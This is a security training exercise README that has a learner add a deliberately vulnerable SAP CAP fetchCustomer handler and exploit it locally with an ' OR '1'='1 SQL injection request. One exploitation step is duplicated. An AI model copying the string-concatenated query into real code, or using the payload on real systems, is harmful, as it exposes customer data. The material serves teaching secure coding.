# Exercise 2 - SQL injection
Vulnerability: [A03:2021-Injection](https://owasp.org/Top10/A03_2021-Injection/)

## 📖  1. Overview :

This exercise demonstrates how unsanitized user inputs can be exploited to perform SQL Injection attacks, thereby compromising the integrity and confidentiality of enterprise data. In the Incident Management system, input fields—such as those accepting cusromer ID numbers are vulnerable if not properly validated. As a result, attackers might inject malicious SQL code to retrieve, alter, or delete sensitive records without detection.

### 📐Business Rules

  - ❌ Users Must not exploit insecure input fields to inject or modify SQL queries.
  - ⚠️ All user inputs must be rigorously validated and sanitized to prevent SQL Injection.

### ⚠️ Why This Matters

 * **Business Impact:** Successful SQL Injection attacks can compromise the integrity and confidentiality of critical data, leading to unauthorized data disclosure, manipulation, or deletion.
 * **Compliance Risk:** Violates [OWASP Top 10 A03](https://owasp.org/Top10/A03_2021-Injection/) and GDPR/PCI DSS requirements for input validation.
 * **Security Risk:** Malicious actors could exfiltrate sensitive data (e.g., credit card numbers) or bypass authorization controls.

### 🎯 Key Learning Objectives

- Understand the mechanics of SQL Injection and how unsanitized inputs can be exploited.
- Learn to implement secure coding practices, such as parameterized queries, to mitigate SQL Injection vulnerabilities.
- Ensure that application data remains secure, protecting sensitive information from unauthorized access or alteration.

## 🚨 2. Vulnerable Code :
We’ll build upon [Exercise 1.2 - Vertical Privilege Escalation](../ex1/ex1.2/README.md)  by introducing an SQL Injection vulnerability resulting from unsanitized user input.

### What We're Adding

1. **CDS Service Definition (srv/services.cds):** A new fetchCustomer function in AdminService that accepts unvalidated input
2. **Vulnerable Implementation (srv/services.js):** Raw SQL query with direct string insertion

**Updated File:** srv/services.cds
Add this vulnerable fetchCustomer function to your existing AdminService definition:

```
... Other methods

annotate ProcessorService.Incidents with @odata.draft.enabled; 
annotate ProcessorService with @(requires: ['support', 'admin']);  // ✅ NEW: Allow both roles support and admin at service level.

/**
 * Service used by administrators to manage customers and incidents.
 */
service AdminService {
    entity Customers as projection on my.Customers;
    entity Incidents as projection on my.Incidents;
  
  // ✅ Add Custom Vulnerable Operation fetchCustomer to AdminService
  // ✅ Exposed via HTTP GET  {{server}}/odata/v4/admin/fetchCustomer with JSON body
    @tags: ['security', 'vulnerable']
    @summary: 'Returns customer data using unvalidated input (for testing only)'
    function fetchCustomer(customerID: String) returns array of Customers;
}
annotate AdminService with @(requires: 'admin');

```
Copy the contents of [services.cds](./srv/services.cds) into your project’s srv/services.cds file.

**Updated File:** srv/services.js

Add The fetchCustomer function handler in services.js

```
const cds = require('@sap/cds');

... Other methods

// AdminService Implementation
class AdminService extends cds.ApplicationService {
  init() {
    // ❌ VULNERABLE: fetchCustomer (SQL Injection)
    this.on('fetchCustomer', async (req) => {
      const { customerID } = req.data;

      // ❌ VULNERABLE CODE: // Direct string embedding in query
      const query = `SELECT * FROM sap.capire.incidents.Customers WHERE ID = '${customerID}'`;
      const results = await cds.run(query);
      return results;
    });

    return super.init();
  }
}
// Export both services
module.exports = {ProcessorService, AdminService};
```
Copy the contents of [services.js](./services_vulnerable.js) into your project’s srv/services.js file.


**Why this is vulnerable:**
- ❌ **No Input Validation:** The user-supplied customerID is concatenated directly into the SQL query without validation, making it possible for an attacker to inject malicious SQL code.
- ❌ **Lack of Parameterized Queries:** The raw SQL query does not use parameter binding or prepared statements, leaving the query structure exposed to manipulation.

## 💥 3. Exploitation (TBD with screenshots)

### Step 1: Create a Test File for HTTP Endpoint:
- Action :
  - Navigate to the `test/http` directory in your CAP project folder.
  - Click on "Add New File" and name it "sql-injection-demo.http".
  - Paste the following content into the file "sql-injection-demo.http":
  
  ```
  @server=http://localhost:4004
  @username=incident.support@tester.sap.com // admin role
  @password=initial
  
  ### Step 1: Legitimate Customer Lookup
  ### Action: Normal request with valid customer ID
  ### Expected: Returns single customer record
  ### Result: System returns data for customer ID 1004100
  GET {{server}}/odata/v4/admin/fetchCustomer
  Content-Type: application/json
  Authorization: Basic {{username}}:{{password}}
  
  {
    "customerID": "1004100"
  }
  
  ### Step 2: SQL Injection Tautology Attack
  ### Action: Inject malicious payload ' OR '1'='1
  ### Expected: Returns ALL customer records
  ### Result: Full database exposure vulnerability
  GET {{server}}/odata/v4/admin/fetchCustomer
  Content-Type: application/json
  Authorization: Basic {{username}}:{{password}}
  
  {
    "customerID": "1004100' OR '1'='1"
  }
  
  ``` 
  Copy the contents of [sql-injection-demo.http](../../test/http/sql-injection-demo.http) into your project’s test/http/sql-injection-demo.http file.

- Result:
  - The test/http/sql-injection-demo.http file is now created and ready for testing.
  - This file contains two HTTP requests:
    - Step 1: A legitimate request to fetch a specific customer.
    - Step 2: A malicious request demonstrating SQL injection vulnerability.

### Step 2: Exploit the SQL Injection Vulnerability:

- Action :
  - Navigate to the `test/http` directory in your CAP project folder.
  - Click on "Add New File" and name it "sql-injection-demo.http".
  - Paste the following content into the file "sql-injection-demo.http":
  
  ```
  @server=http://localhost:4004
  @username=incident.support@tester.sap.com // admin role
  @password=initial
  
  ### Step 1: Legitimate Customer Lookup
  ### Action: Normal request with valid customer ID
  ### Expected: Returns single customer record
  ### Result: System returns data for customer ID 1004100
  GET {{server}}/odata/v4/admin/fetchCustomer
  Content-Type: application/json
  Authorization: Basic {{username}}:{{password}}
  
  {
    "customerID": "1004100"
  }
  
  ### Step 2: SQL Injection Tautology Attack
  ### Action: Inject malicious payload ' OR '1'='1
  ### Expected: Returns ALL customer records
  ### Result: Full database exposure vulnerability
  GET {{server}}/odata/v4/admin/fetchCustomer
  Content-Type: application/json
  Authorization: Basic {{username}}:{{password}}
  
  {
    "customerID": "1004100' OR '1'='1"
  }
  
  ``` 
  Copy the contents of [sql-injection-demo.http](../../test/http/sql-injection-demo.http) into your project’s test/http/sql-injection-demo.http file.

- Result:
  - The test/http/sql-injection-demo.http file is now created and ready for testing.
  - This file contains two HTTP requests:
    - Step 1: A legitimate request to fetch a specific customer.
    - Step 2: A malicious request demonstrating SQL injection vulnerability.

### Step 2: Exploit the SQL Injection Vulnerability

- Action:
  - Open the `sql-injection-demo.http` file in your editor.
  - Confirm in your `package.json` file that the user `incident.support@tester.sap.com` is assigned the `admin` role under the `cds.requires.[development].auth.users` configuration.
  - Navigates to a function in ###Step2 that looks up customer information and click on send request.
  
    ``` 
    ### Step 2: SQL Injection Tautology Attack
    ### Action: Inject malicious payload ' OR '1'='1
    ### Expected: Returns ALL customer records
    ### Result: Full database exposure vulnerability
    GET {{server}}/odata/v4/admin/fetchCustomer
    Content-Type: application/json
    Authorization: Basic {{username}}:{{password}}
    
    {
      "customerID": "1004100' OR '1'='1"
    }

    ```

### 📌Critical Vulnerability Summary
- ❌ **Complete Data Breach:** Any authenticated user can extract the entire contents of the customer table.
- ❌ **Insecure SQL Concatenation:** The services.js code uses direct string concatenation ('${customerID}') to build an SQL query instead of using parameterized queries.
- ❌ **Lack of Input Sanitization:** No validation or sanitization is performed on the customerID input parameter before it is used in the SQL query.








